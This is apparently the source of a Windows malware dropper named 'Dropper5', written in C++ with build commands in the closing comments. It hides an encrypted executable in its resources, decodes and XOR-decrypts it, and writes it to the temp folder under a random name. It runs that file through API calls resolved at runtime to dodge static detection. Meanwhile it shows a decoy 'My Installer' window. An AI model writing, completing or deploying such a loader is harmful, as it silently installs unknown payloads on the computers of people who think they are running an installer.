#define UNICODE
#define _UNICODE
#include <windows.h>
#include <gdiplus.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "gdiplus.lib")

#define IDR_EXE1 101
#define IDR_BG   102
#define IDR_ISO 103

#define XOR_KEY  0x5A

using namespace Gdiplus;

ULONG_PTR g_gdiplusToken = 0;
Image* g_bgImage = NULL;

#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

// Decodes a Base64 text buffer (not null-terminated necessarily).
// `pBase64` points to base64 bytes, length is 'cbBase64'.
// On success returns pointer to newly malloc'd buffer and sets *pcbOut.
// Caller must free() returned buffer.
BYTE* DecodeBase64Resource(const BYTE* pBase64, DWORD cbBase64, DWORD* pcbOut) {
    if (!pBase64 || cbBase64 == 0 || !pcbOut) return NULL;
    // CryptStringToBinaryA expects a null-terminated C string or length. We can pass length.
    DWORD outLen = 0;
    BOOL ok = CryptStringToBinaryA((LPCSTR)pBase64, (DWORD)cbBase64,
                                   CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL);
    if (!ok || outLen == 0) return NULL;

    BYTE* out = (BYTE*)malloc(outLen);
    if (!out) return NULL;

    ok = CryptStringToBinaryA((LPCSTR)pBase64, (DWORD)cbBase64,
                              CRYPT_STRING_BASE64, out, &outLen, NULL, NULL);
    if (!ok) { free(out); return NULL; }

    *pcbOut = outLen;
    return out;
}
bool GetDecodedResourceBuffer(HMODULE hModule, int resId, BYTE** ppOut, DWORD* pOutSize) {
    if (!ppOut || !pOutSize) return false;
    *ppOut = NULL;
    *pOutSize = 0;

    HRSRC hRes = FindResourceW(hModule, MAKEINTRESOURCE(resId), RT_RCDATA);
    if (!hRes) return false;

    HGLOBAL hGlob = LoadResource(hModule, hRes);
    if (!hGlob) return false;

    DWORD resSize = SizeofResource(hModule, hRes);
    if (resSize == 0) return false;

    const BYTE* pResData = (const BYTE*)LockResource(hGlob);
    if (!pResData) return false;

    DWORD decodedSize = 0;
    BYTE* decoded = DecodeBase64Resource(pResData, resSize, &decodedSize);
    if (!decoded || decodedSize == 0) {
        if (decoded) free(decoded);
        return false;
    }

    *ppOut = decoded;       // caller takes ownership
    *pOutSize = decodedSize;
    return true;
}


// -----------------------------------------------------------
// XOR decrypt
void xor_decrypt(BYTE* data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; ++i) {
        data[i] ^= key;
    }
}

// -----------------------------------------------------------
// Dynamic Unicode API resolver
FARPROC ResolveAPIW(LPCWSTR dllName, LPCSTR funcName) {
    HMODULE hMod = LoadLibraryW(dllName);
    if (!hMod) return NULL;
    return GetProcAddress(hMod, funcName);
}

// -----------------------------------------------------------
// Extract, decrypt, and run embedded EXE
void DropAndRun(HMODULE hModule) {
    WCHAR tempPath[MAX_PATH] = {0};
    WCHAR fullPath[MAX_PATH] = {0};

    // GetTempPathW
    typedef DWORD (WINAPI* GetTempPathW_t)(DWORD, LPWSTR);
    GetTempPathW_t pGetTempPathW = (GetTempPathW_t)ResolveAPIW(L"kernel32.dll", "GetTempPathW");
    if (!pGetTempPathW) return;
    pGetTempPathW(MAX_PATH, tempPath);

    // create random filename
    srand((unsigned int)time(NULL));
    WCHAR fileName[20];
    swprintf(fileName, 20, L"D%04d.exe", rand() % 10000);
    wcscpy(fullPath, tempPath);
    wcscat(fullPath, fileName);

    // --- Decode resource into memory (no file I/O yet) ---
    BYTE* decodedPayload = NULL;
    DWORD decodedSize = 0;
    if (!GetDecodedResourceBuffer(hModule, IDR_EXE1, &decodedPayload, &decodedSize)) {
        // fail quietly (or MessageBoxW to debug)
        return;
    }


    BYTE* payload = (BYTE*)LockResource(decodedPayload);
    if (!payload) return;


    BYTE* decrypted = (BYTE*)malloc(decodedSize);
    if (!decrypted) return;
    memcpy(decrypted, payload, decodedSize);
    xor_decrypt(decrypted, decodedSize, XOR_KEY);

    // Write to disk
    FILE* f = _wfopen(fullPath, L"wb");
    if (f) {
        fwrite(decrypted, 1, decodedSize, f);
        fclose(f);
    }
    free(decrypted);

    // Run executable
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    typedef BOOL (WINAPI* CreateProcessW_t)(
        LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

    CreateProcessW_t pCreateProcessW = (CreateProcessW_t)ResolveAPIW(L"kernel32.dll", "CreateProcessW");
    if (pCreateProcessW) {
        pCreateProcessW(fullPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// -----------------------------------------------------------
// Load PNG/JPG from RCDATA
Image* LoadImageFromResource(HMODULE hModule, int resId) {
    HRSRC hr = FindResourceW(hModule, MAKEINTRESOURCE(resId), RT_RCDATA);
    if (!hr) return NULL;

    HGLOBAL hg = LoadResource(hModule, hr);
    if (!hg) return NULL;

    DWORD size = SizeofResource(hModule, hr);
    if (size == 0) return NULL;

    void* data = LockResource(hg);
    if (!data) return NULL;

    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
    if (!hMem) return NULL;

    void* pMem = GlobalLock(hMem);
    if (!pMem) { GlobalFree(hMem); return NULL; }
    memcpy(pMem, data, size);
    GlobalUnlock(hMem);

    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(hMem, TRUE, &pStream) != S_OK) {
        GlobalFree(hMem);
        return NULL;
    }

    Image* img = Image::FromStream(pStream, FALSE);
    pStream->Release();

    if (img && img->GetLastStatus() != Ok) {
        delete img;
        return NULL;
    }
    return img;
}

// -----------------------------------------------------------
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        if (g_bgImage) {
            Graphics g(hdc);
            RECT rc;
            GetClientRect(hWnd, &rc);
            g.DrawImage(g_bgImage, Rect(0, 0, rc.right-rc.left, rc.bottom-rc.top));
        } else {
            FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW+1));
        }
        EndPaint(hWnd, &ps);
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hWnd, msg, wParam, lParam);
}
void ShowIsoResourceSize(HMODULE hModule) {
    HRSRC hResIso = FindResourceW(hModule, MAKEINTRESOURCE(IDR_ISO), RT_RCDATA);
    if (!hResIso) {
        MessageBoxW(NULL, L"IDR_ISO not found", L"Resource test", MB_OK);
        return;
    }
    DWORD size = SizeofResource(hModule, hResIso);
    WCHAR buf[128];
    swprintf(buf, 128, L"IDR_ISO found: %u bytes", (unsigned)size);
    MessageBoxW(NULL, buf, L"Resource test", MB_OK);
}
// -----------------------------------------------------------
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR lpCmdLine, int nCmdShow) {
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) != Ok) {
        MessageBoxW(NULL, L"Failed to init GDI+", L"Error", MB_OK|MB_ICONERROR);
        return 1;
    }
    DropAndRun(hInst);
    // Load background image
    g_bgImage = LoadImageFromResource(hInst, IDR_BG);
   
    ShowIsoResourceSize(hInst);

    // Create window to display background
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = L"MyInstallerClass";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wc);

    HWND hWnd = CreateWindowW(wc.lpszClassName, L"My Installer", WS_OVERLAPPEDWINDOW,
                              CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, NULL, NULL, hInst, NULL);
    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    delete g_bgImage;
    GdiplusShutdown(g_gdiplusToken);
    return (int)msg.wParam;
}
//python xor_encrypt.py 1 33.bin    
//base64 33.bin > 333.bin
//x86_64-w64-mingw32-windres res.rc -O coff -o res.o 
//x86_64-w64-mingw32-g++ Dropper5.cpp res.o \
  -static -static-libgcc -static-libstdc++ \
  -lgdiplus -luser32 -lgdi32 -lole32 -luuid -lcrypt32\
  -mwindows -municode -o Dropper5.exe
